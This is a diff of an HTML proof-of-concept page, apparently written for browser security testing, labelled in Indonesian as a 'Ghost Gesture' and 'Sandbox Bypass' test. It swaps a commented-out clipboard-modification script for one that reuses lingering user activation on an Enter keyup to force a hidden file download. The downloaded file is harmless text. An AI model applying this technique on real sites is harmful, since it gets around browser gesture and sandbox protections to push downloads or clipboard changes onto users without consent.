@@ -33,7 +33,7 @@
     <div id="timer">2s...</div>
     <div id="status">Tahan terus sampai 1s</div>
 
-    <script>
+    <!-- <script>
         setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
         setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);
 
@@ -49,6 +49,42 @@
                         console.log("Ghost Gesture Success: Clipboard modified.");
                     } catch (err) {
                         status.innerText = "RESULT: FAILED (Blocked by Permission Policy)";
+                        status.style.color = "red";
+                        console.error(err);
+                    }
+                } else {
+                    status.innerText = "RESULT: EXPIRED (User Activation was reset)";
+                    status.style.color = "blue";
+                }
+            }
+        });
+    </script> -->
+    <script>
+        setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
+        setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);
+
+        window.addEventListener('keyup', async (e) => {
+            if (e.key === 'Enter') {
+                const status = document.getElementById('status');
+                if (navigator.userActivation.isActive) {
+                    try {
+                        const content = "Ini adalah file hasil ujicoba Sandbox Bypass.";
+                        const blob = new Blob([content], { type: 'text/plain' });
+                        const url = window.URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.style.display = 'none';
+                        a.href = url;
+                        a.download = 'poc_download.txt'; // Nama file
+                        document.body.appendChild(a);
+                        a.click();
+                        window.URL.revokeObjectURL(url);
+                        document.body.removeChild(a);
+
+                        status.innerText = "RESULT: SUCCESS (Download Triggered!)";
+                        status.style.color = "green";
+                        console.log("Ghost Gesture Success: Download initiated.");
+                    } catch (err) {
+                        status.innerText = "RESULT: FAILED (Blocked by Sandbox/Policy)";
                         status.style.color = "red";
                         console.error(err);
                     }
